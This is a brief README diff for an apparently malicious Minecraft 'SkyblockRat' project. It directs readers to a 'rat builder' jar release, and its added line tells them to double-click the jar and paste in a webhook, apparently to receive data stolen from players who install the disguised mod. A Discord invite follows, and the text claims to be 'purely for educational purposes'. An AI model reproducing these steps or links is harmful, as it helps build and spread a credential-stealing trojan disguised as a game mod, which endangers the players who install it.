@@ -3,6 +3,7 @@
 ## This is purely for educational purposes
 
 ## to turn this code into a .jar minecraft mod use the rat builder (newsilly-1.0.jar) in https://github.com/iLoveRat/SkyblockRat/releases/tag/ratbuilderlatest
+### just download and double click, then put your webhook into the box.
 
 ### https://discord.gg/aKEYP4cGSq
 
